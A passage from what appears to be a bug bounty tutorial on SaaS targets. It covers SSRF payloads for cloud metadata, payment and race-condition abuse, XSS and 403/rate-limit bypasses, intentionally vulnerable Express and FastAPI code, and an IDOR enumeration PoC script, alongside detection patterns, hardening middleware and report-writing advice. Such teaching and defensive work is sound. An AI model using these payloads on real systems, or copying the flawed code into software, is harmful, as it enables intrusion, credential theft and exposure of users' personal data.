Content-Type: application/json

{
  "name": "My Webhook",
  "url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
  "events": ["invoice.paid"]
}

# URL parser bypass techniques
{
  "url": "http://[::ffff:169.254.169.254]/latest/meta-data/"
}

{
  "url": "http://169.254.169.254.nip.io/latest/meta-data/"
}

{
  "url": "http://0x7f000001/internal-admin"
}

{
  "url": "http://2130706433/internal-admin"
}

{
  "url": "http://017700000001/internal-admin"
}

# DNS rebinding
{
  "url": "http://rebind.network/169.254.169.254"
}
```

### 8.4 Business Logic Vulnerabilities

These are the most valuable bugs because scanners cannot find them:

```http
# Payment manipulation -- modify price client-side
POST /api/checkout HTTP/1.1
Host: api.target.com
Authorization: Bearer <token>
Content-Type: application/json

{
  "items": [
    {"product_id": "prod_premium_plan", "quantity": 1, "price": 0.01}
  ],
  "payment_method": "pm_xxxx",
  "coupon": null
}

# Race condition on coupon application
# Send 20 simultaneous requests applying the same single-use coupon
# Using Turbo Intruder in Burp:
```

```python
# Turbo Intruder script for race condition
def queueRequests(target, wordlists):
    engine = RequestEngine(
        endpoint=target.endpoint,
        concurrentConnections=20,
        requestsPerConnection=1,
        pipeline=False
    )

    # Prepare the request
    request = '''POST /api/apply-coupon HTTP/1.1
Host: api.target.com
Authorization: Bearer <token>
Content-Type: application/json
Connection: keep-alive

{"coupon_code": "SINGUSE50OFF", "order_id": "order_abc123"}'''

    # Queue 20 identical requests
    for i in range(20):
        engine.queue(request, gate='race1')

    # Release all at once (last-byte synchronization)
    engine.openGate('race1')

def handleResponse(req, interesting):
    table.add(req)
```

---

## 9. Common Bypass Techniques

### 9.1 WAF Bypass for XSS

```html
<!-- Standard payload blocked -->
<script>alert(1)</script>

<!-- Bypass with event handlers -->
<img src=x onerror=alert(1)>

<!-- Bypass with SVG -->
<svg onload=alert(1)>

<!-- Bypass with template literals -->
<img src=x onerror=alert`1`>

<!-- Bypass keyword filters -->
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>

<!-- Bypass with JavaScript protocol -->
<a href="javascript:alert(1)">click</a>

<!-- Bypass with mutation XSS (mXSS) -->
<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>

<!-- Bypass with DOM clobbering -->
<form id="x"><input name="y" value="javascript:alert(1)"></form>
```

### 9.2 403 Bypass Techniques

```bash
# Path manipulation
curl -s -o /dev/null -w "%{http_code}" https://target.com/admin        # 403
curl -s -o /dev/null -w "%{http_code}" https://target.com/admin/       # 200?
curl -s -o /dev/null -w "%{http_code}" https://target.com//admin       # 200?
curl -s -o /dev/null -w "%{http_code}" https://target.com/./admin      # 200?
curl -s -o /dev/null -w "%{http_code}" https://target.com/admin..;/    # 200?
curl -s -o /dev/null -w "%{http_code}" https://target.com/%2fadmin     # 200?
curl -s -o /dev/null -w "%{http_code}" https://target.com/admin%20     # 200?
curl -s -o /dev/null -w "%{http_code}" https://target.com/admin%09     # 200?
curl -s -o /dev/null -w "%{http_code}" https://target.com/admin.json   # 200?

# Header-based bypass
curl -H "X-Original-URL: /admin" https://target.com/
curl -H "X-Rewrite-URL: /admin" https://target.com/
curl -H "X-Forwarded-For: 127.0.0.1" https://target.com/admin
curl -H "X-Real-IP: 127.0.0.1" https://target.com/admin
curl -H "X-Custom-IP-Authorization: 127.0.0.1" https://target.com/admin
curl -H "X-Forwarded-Host: localhost" https://target.com/admin

# HTTP method override
curl -X POST https://target.com/admin
curl -H "X-HTTP-Method-Override: GET" -X POST https://target.com/admin
curl -H "X-Method-Override: PUT" https://target.com/admin
```

### 9.3 Rate Limit Bypass

```http
# IP rotation via headers
X-Forwarded-For: 1.2.3.4
X-Real-IP: 5.6.7.8
X-Originating-IP: 9.10.11.12
X-Client-IP: 13.14.15.16

# Change endpoint case
POST /api/Login
POST /api/LOGIN
POST /api/login/

# Add parameters
POST /api/login?dummy=1
POST /api/login#fragment

# Different content types
Content-Type: application/json
Content-Type: application/x-www-form-urlencoded
Content-Type: text/xml

# Unicode character injection
POST /api/log%69n
```

---

## 10. Common Developer Mistakes

Understanding what developers get wrong helps you know where to look:

### Node.js/Express Mistakes

```javascript
// MISTAKE 1: Using user input in MongoDB queries without sanitization
app.post('/api/login', async (req, res) => {
  const { email, password } = req.body;
  // NoSQL injection: {"email": {"$gt": ""}, "password": {"$gt": ""}}
  const user = await User.findOne({ email: email, password: password });
  if (user) return res.json({ token: generateToken(user) });
  res.status(401).json({ error: 'Invalid credentials' });
});

// MISTAKE 2: JWT signed with weak/default secret
const token = jwt.sign(payload, 'secret', { expiresIn: '24h' });

// MISTAKE 3: No ownership check on resource access
app.get('/api/invoices/:id', authenticate, async (req, res) => {
  // Missing: req.user.id === invoice.user_id check
  const invoice = await Invoice.findById(req.params.id);
  res.json(invoice);
});

// MISTAKE 4: Mass assignment
app.put('/api/user/profile', authenticate, async (req, res) => {
  // Directly spreading user input into the update
  await User.findByIdAndUpdate(req.user.id, { ...req.body });
  res.json({ message: 'Updated' });
});

// MISTAKE 5: SSRF via unvalidated URL
app.post('/api/fetch-url', async (req, res) => {
  const response = await axios.get(req.body.url); // No URL validation
  res.json({ content: response.data });
});
```

### FastAPI Mistakes

```python
# MISTAKE 1: SQL injection via string formatting
@app.get("/api/users/search")
async def search_users(q: str, db: Session = Depends(get_db)):
    # Direct string interpolation in SQL
    result = db.execute(f"SELECT * FROM users WHERE name LIKE '%{q}%'")
    return result.fetchall()

# MISTAKE 2: No authorization check on endpoints
@app.get("/api/admin/users")
async def list_all_users(db: Session = Depends(get_db)):
    # No role check - any authenticated user can access
    return db.query(User).all()

# MISTAKE 3: Insecure deserialization
@app.post("/api/import")
async def import_data(data: bytes = Body(...)):
    # pickle.loads on user input
    import pickle
    obj = pickle.loads(data)
    return {"imported": len(obj)}

# MISTAKE 4: Path traversal in file download
@app.get("/api/files/{filename}")
async def download_file(filename: str):
    # No path sanitization
    return FileResponse(f"/app/uploads/{filename}")
    # Attack: /api/files/../../etc/passwd
```

---

## 11. Detection Strategies

If you are on the defensive side, here is how to detect these attacks:

```python
# FastAPI middleware for detecting suspicious patterns
from fastapi import Request
import re
import logging

SQLI_PATTERNS = [
    r"(\b(union|select|insert|update|delete|drop|alter)\b.*\b(from|into|table|where)\b)",
    r"(--|\#|\/\*)",
    r"(\b(or|and)\b\s+\d+\s*=\s*\d+)",
    r"(sleep\s*\(|benchmark\s*\(|waitfor\s+delay)",
]

SSRF_PATTERNS = [
    r"169\.254\.169\.254",
    r"127\.0\.0\.1",
    r"localhost",
    r"\[::1\]",
    r"0x7f000001",
    r"metadata\.google\.internal",
]

async def security_middleware(request: Request, call_next):
    body = await request.body()
    body_str = body.decode('utf-8', errors='ignore')
    url_str = str(request.url)

    # Check for SQLi
    for pattern in SQLI_PATTERNS:
        if re.search(pattern, body_str, re.IGNORECASE) or \
           re.search(pattern, url_str, re.IGNORECASE):
            logging.warning(f"SQLi attempt from {request.client.host}: {url_str}")
            # Alert but don't block (avoid false positives disrupting users)

    # Check for SSRF
    for pattern in SSRF_PATTERNS:
        if re.search(pattern, body_str, re.IGNORECASE):
            logging.critical(f"SSRF attempt from {request.client.host}: {body_str[:200]}")

    response = await call_next(request)
    return response
```

```javascript
// Node.js/Express rate limiting with sliding window
const rateLimit = require('express-rate-limit');
const RedisStore = require('rate-limit-redis');
const Redis = require('ioredis');

const redis = new Redis(process.env.REDIS_URL);

const loginLimiter = rateLimit({
  store: new RedisStore({ sendCommand: (...args) => redis.call(...args) }),
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 5,                    // 5 attempts per window
  standardHeaders: true,
  legacyHeaders: false,
  keyGenerator: (req) => {
    // Rate limit by account, not IP (prevents IP rotation bypass)
    return req.body.email || req.ip;
  },
  handler: (req, res) => {
    // Log for security monitoring
    console.warn(`Rate limit hit: ${req.body.email} from ${req.ip}`);
    res.status(429).json({
      error: 'Too many login attempts. Try again in 15 minutes.'
    });
  }
});

app.post('/api/login', loginLimiter, loginHandler);
```

---

## 12. Prevention Strategies

### Comprehensive Security Middleware (Node.js)

```javascript
const helmet = require('helmet');
const hpp = require('hpp');
const mongoSanitize = require('express-mongo-sanitize');
const xss = require('xss-clean');
const cors = require('cors');

// Security headers
app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'"],
      styleSrc: ["'self'", "'unsafe-inline'"],
      imgSrc: ["'self'", "data:", "https:"],
      connectSrc: ["'self'", "https://api.target.com"],
      frameSrc: ["'none'"],
      objectSrc: ["'none'"],
    }
  },
  hsts: { maxAge: 31536000, includeSubDomains: true, preload: true },
}));

// NoSQL injection prevention
app.use(mongoSanitize({ replaceWith: '_' }));

// XSS prevention
app.use(xss());

// HTTP parameter pollution prevention
app.use(hpp());

// CORS -- explicit origin list, not wildcard
app.use(cors({
  origin: ['https://app.target.com', 'https://admin.target.com'],
  credentials: true,
  methods: ['GET', 'POST', 'PUT', 'DELETE'],
  allowedHeaders: ['Content-Type', 'Authorization'],
}));
```

### Authorization Pattern (Ownership Check)

```javascript
// Reusable ownership middleware
const requireOwnership = (resourceModel, resourceIdParam = 'id') => {
  return async (req, res, next) => {
    const resource = await resourceModel.findById(req.params[resourceIdParam]);
    if (!resource) return res.status(404).json({ error: 'Not found' });
    if (resource.user_id.toString() !== req.user.id.toString()) {
      // Log the access attempt for security monitoring
      logger.warn(`IDOR attempt: user ${req.user.id} tried to access ${resourceModel.modelName} ${req.params[resourceIdParam]}`);
      return res.status(403).json({ error: 'Forbidden' });
    }
    req.resource = resource;
    next();
  };
};

app.get('/api/invoices/:id', authenticate, requireOwnership(Invoice), (req, res) => {
  res.json(req.resource);
});
```

---

## 13. Bug Bounty Report Example

A well-written report can mean the difference between a $500 and $5,000 payout.

### Report: IDOR Leading to Full Account Takeover via Invoice Endpoint

```
Title: IDOR in /api/v2/invoices/{id} Allows Access to Any User's
       Invoices Including PII and Payment Data

Severity: High (CVSS 8.6)
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:L/A:N

## Summary
The /api/v2/invoices/{id} endpoint does not verify that the requesting
user owns the requested invoice. Any authenticated user can read any
other user's invoices by iterating the sequential invoice ID. Invoices
contain full name, email, billing address, and the last 4 digits of
the payment card.

## Reproduction Steps

### Prerequisites
- Two registered accounts: attacker@evil.com (Account A) and
  victim@test.com (Account B)
- Account B must have at least one invoice

### Steps
1. Log in as Account A
2. Navigate to "Billing" and note your invoice ID format (e.g., INV-2024-4521)
3. Open Burp Suite and intercept the request to your own invoice:
   GET /api/v2/invoices/INV-2024-4521
4. Send to Repeater
5. Change the invoice ID to INV-2024-4520 (previous invoice, belongs to Account B)
6. Observe: the response returns Account B's full invoice data including PII

### HTTP Request
GET /api/v2/invoices/INV-2024-4520 HTTP/1.1
Host: api.target.com
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
Accept: application/json

### Response (redacted)
{
  "id": "INV-2024-4520",
  "user": {
    "name": "Jane Doe",
    "email": "victim@test.com",
    "billing_address": "123 Main St, San Francisco, CA 94102"
  },
  "amount": 299.99,
  "payment_method": {
    "type": "card",
    "last4": "4242",
    "brand": "visa"
  },
  "items": [
    {"name": "Enterprise Plan", "quantity": 1, "price": 299.99}
  ]
}

## Impact
- Any authenticated user can enumerate and access ALL invoices
  in the system
- Exposed PII: full name, email, billing address, partial card info
- Sequential IDs make enumeration trivial (tested IDs 1 through 10,000)
- Estimated affected users: all users with billing history
- Potential GDPR/CCPA violation due to PII exposure

## Root Cause
The endpoint handler retrieves the invoice by ID without verifying
that the requesting user's ID matches the invoice's user_id field.

## Recommended Fix
Add ownership verification before returning the resource:

  const invoice = await Invoice.findById(req.params.id);
  if (invoice.user_id !== req.user.id) {
    return res.status(403).json({ error: 'Forbidden' });
  }

Additionally, replace sequential IDs with UUIDs to prevent enumeration.

## Attachments
- screenshot_own_invoice.png (my legitimate invoice request)
- screenshot_victim_invoice.png (unauthorized access to other invoice)
- poc_enumeration_script.py (iterates first 100 invoice IDs)
- video_poc.mp4 (full reproduction walkthrough)
```

---

## 14. Severity Assessment (CVSS Scoring)

Understanding CVSS is critical for both writing reports and negotiating payouts.

### CVSS 3.1 Quick Reference

```
Attack Vector (AV):
  Network (N) = remotely exploitable          (0.85)
  Adjacent (A) = requires shared network      (0.62)
  Local (L) = requires local access           (0.55)
  Physical (P) = requires physical access     (0.20)

Attack Complexity (AC):
  Low (L)  = no special conditions            (0.77)
  High (H) = requires specific configuration  (0.44)

Privileges Required (PR):
  None (N) = no auth needed                   (0.85)
  Low (L)  = basic user account               (0.62/0.68)
  High (H) = admin/privileged account         (0.27/0.50)

User Interaction (UI):
  None (N) = no victim interaction            (0.85)
  Required (R) = victim must click/interact   (0.62)

Scope (S):
  Unchanged (U) = stays in vulnerable component
  Changed (C)   = impacts other components

Confidentiality/Integrity/Availability (C/I/A):
  High (H) = total compromise
  Low (L)  = limited compromise
  None (N) = no impact
```

### Scoring Common Bug Types

```
Stored XSS on main app:
  AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N = 6.4 (Medium)
  BUT argue business impact: session hijacking, phishing = push for High

IDOR reading other user's data:
  AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N = 6.5 (Medium)
  With PII: argue regulatory impact = push for High

SQL injection (data exfiltration):
  AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H = 9.8 (Critical)

SSRF to cloud metadata:
  AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:L/A:N = 8.5 (High)
  With IAM credential theft: argue full infrastructure = Critical

Unauthenticated RCE:
  AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H = 10.0 (Critical)
```

### Business Impact Framing

Technical CVSS alone does not capture full severity. Always include business impact:

```
Technical Impact             Business Impact Frame
-------------------          -----------------------------------
Read other users' data       "Affects all 50,000 active users' PII.
                              GDPR Article 33 requires notification
                              within 72 hours."

Modify payment amounts       "Allows attackers to purchase $999/month
                              Enterprise plans for $0.01. Revenue
                              loss is unbounded."

Admin account takeover       "Grants access to the admin panel with
                              full CRUD on all 50,000 user accounts,
                              billing data, and API keys."

SSRF to metadata             "Yields temporary AWS credentials with
                              the application's IAM role. This role
                              has S3 read/write and RDS access,
                              enabling full database exfiltration."
```

---

## 15. Writing Strong PoCs

A PoC proves exploitability. The best PoCs are undeniable.

### PoC Checklist

```
1. Minimal reproduction script (Python preferred)
   - Self-contained, runs with standard libraries + requests
   - Accepts target URL and credentials as arguments
   - Prints clear output showing the vulnerability

2. Screenshots
   - Annotated with arrows/boxes showing the critical parts
   - Include request and response side by side
   - Timestamp visible in Burp

3. Video walkthrough
   - 2-5 minutes maximum
   - Start from browser login, show entire flow
   - Use OBS or asciinema for terminal recordings

4. Impact demonstration
   - Show the actual sensitive data accessed
   - Show the scope (how many records affected)
   - Show persistence (does access survive password change?)
```

### PoC Script Template

```python
#!/usr/bin/env python3
"""
PoC: IDOR in /api/v2/invoices/{id}
Target: api.target.com
Author: your-handle
Date: 2026-04-02
"""

import requests
import sys
import json

def exploit(base_url, attacker_token, target_invoice_id):
    """
    Demonstrates unauthorized access to another user's invoice.
    """
    headers = {
        "Authorization": f"Bearer {attacker_token}",
        "Content-Type": "application/json"
    }

    print(f"[*] Attempting to access invoice: {target_invoice_id}")
    print(f"[*] Using attacker's token (should NOT have access)")

    resp = requests.get(
        f"{base_url}/api/v2/invoices/{target_invoice_id}",
        headers=headers
    )

    if resp.status_code == 200:
        data = resp.json()
        print(f"[!] VULNERABLE - Unauthorized access successful!")
        print(f"    Invoice ID: {data['id']}")
        print(f"    Owner Email: {data['user']['email']}")
        print(f"    Amount: ${data['amount']}")
        print(f"    Billing Address: {data['user']['billing_address']}")
        return True
    elif resp.status_code == 403:
        print(f"[-] Access denied (not vulnerable)")
        return False
    else:
        print(f"[?] Unexpected status: {resp.status_code}")
        print(f"    Response: {resp.text[:200]}")
        return False

def enumerate(base_url, attacker_token, start_id, count=100):
    """
    Enumerates invoices to demonstrate scope of impact.
    """
    headers = {"Authorization": f"Bearer {attacker_token}"}
    accessible = 0

    print(f"\n[*] Enumerating {count} invoices starting from {start_id}")
    for i in range(start_id, start_id + count):
        invoice_id = f"INV-2024-{i:04d}"
        resp = requests.get(
            f"{base_url}/api/v2/invoices/{invoice_id}",
            headers=headers
        )
        if resp.status_code == 200:
            accessible += 1
            email = resp.json().get('user', {}).get('email', 'unknown')
            print(f"    [+] {invoice_id} - {email}")

    print(f"\n[!] Accessible: {accessible}/{count} invoices ({accessible/count*100:.0f}%)")

if __name__ == "__main__":
    if len(sys.argv) < 4:
        print(f"Usage: {sys.argv[0]} <base_url> <attacker_token> <target_invoice_id>")
        print(f"Example: {sys.argv[0]} https://api.target.com eyJhbGc... INV-2024-4520")
        sys.exit(1)

    base_url = sys.argv[1]
    token = sys.argv[2]
    invoice_id = sys.argv[3]

    exploit(base_url, token, invoice_id)
```

---

## 16. Common Duplicate Avoidance Techniques

Duplicates are the biggest time waster in bug bounty. Here is how to minimize them:

### Pre-Submission Checklist

```
1. Search Disclosed Reports
   - HackerOne: check the program's disclosed reports (Hacktivity)
   - Search "site:hackerone.com target.com IDOR" etc.
   - Check if the exact endpoint has been reported before

2. Check Timing
   - If a feature launched this week: low duplicate risk, submit quickly
   - If the feature is 2+ years old: high duplicate risk, need a novel angle

3. Check Complexity
   - Simple reflected XSS on main domain: almost certainly duplicate
   - Chained attack (IDOR + CSRF + XSS): much lower duplicate risk

4. Unique Angle Indicators
   - New subdomain or recently deployed feature
   - Mobile-only API endpoint (fewer hunters test mobile)
   - GraphQL-specific vulnerability
   - Business logic flaw (unique to this application's flow)
   - Race condition in payment processing
   - Chained vulnerabilities that escalate impact
```

### Differentiation Strategies

```
Instead of:                           Do this:
-------                               -------
Reflected XSS on search page          XSS that chains to account takeover
IDOR on profile endpoint              IDOR that accesses payment data + PII
Open redirect                         Open redirect that bypasses OAuth flow
Missing rate limit                    Rate limit bypass that enables credential
                                      stuffing with account takeover PoC
Information disclosure                Info disclosure that leaks admin creds
                                      or API keys with demonstrated impact
```

---

## 17. Time Management and Focus Strategies

### The 80/20 Rule Applied

```
Spend 80% of time on:
  - Authorization testing (IDOR, BOLA, BFLA, privilege escalation)
  - Business logic flaws (payment, subscription, invitation flows)
  - SSRF (webhook endpoints, URL fetchers, integrations)
  - Authentication bypass (JWT, OAuth, session management)

Spend 20% (or less) on:
  - XSS (low payouts, high duplicates unless chained)
  - Open redirects (low severity unless chaining)
  - Information disclosure (unless it leaks secrets)
  - Missing headers (usually informational/won't fix)
```

### Session Structure

```
Monday-Tuesday: Recon on 2-3 new targets
  - Full subdomain + endpoint enumeration
  - Technology fingerprinting
  - Screenshot review
  - Note interesting attack surface

Wednesday-Thursday: Deep manual testing on best target
  - Burp Suite workflow (scope, crawl, manual browse)
  - Autorize testing with two privilege levels
  - Business logic testing on payment/subscription flows
  - API testing (GraphQL, REST, mobile)

Friday: Follow-up and reporting
  - Write up any findings from the week
  - Respond to triage team questions
  - Review newly disclosed reports for learning
  - Update recon data (re-run pipeline)

Weekend: Skill development
  - Practice new techniques on labs
  - Study disclosed reports
  - Build automation tools
```

---

## 18. Lab Setup for Practice

Build a local environment to test your methodology without legal risk:

```bash
# Quick lab setup with intentionally vulnerable apps
docker run -d -p 3000:3000 bkimminich/juice-shop        # OWASP Juice Shop
docker run -d -p 8080:80 vulnerables/web-dvwa            # DVWA
docker run -d -p 5013:5013 dolevf/dvga                   # Damn Vulnerable GraphQL
docker run -d -p 4000:4000 carlospolop/hacktricks-cloud  # Cloud security practice

# Or build your own (see Blog 18: Building Your Own Vulnerable Lab)
```

---

## Conclusion

Bug bounty on modern SaaS is a systematic discipline, not a game of chance. The methodology laid out here -- structured recon, disciplined Burp workflows, targeted manual testing, and clear reporting -- is what separates consistent earners from frustrated hunters.

The hunters earning $100k+ annually are not smarter. They are more systematic. They have recon pipelines that run while they sleep. They use Autorize on every target. They test mobile APIs that other hunters ignore. They write reports that make triage teams want to pay more.

Start with one target. Run the full pipeline. Spend a week on manual testing. Write one excellent report. Then do it again.

The bugs are there. The question is whether your methodology is good enough to find them before someone else does.

---

**Continue the series:** The next post covers building your own vulnerable lab environment to practice every technique discussed here. No more relying on outdated, shared practice applications -- build a lab that mirrors real SaaS architecture.
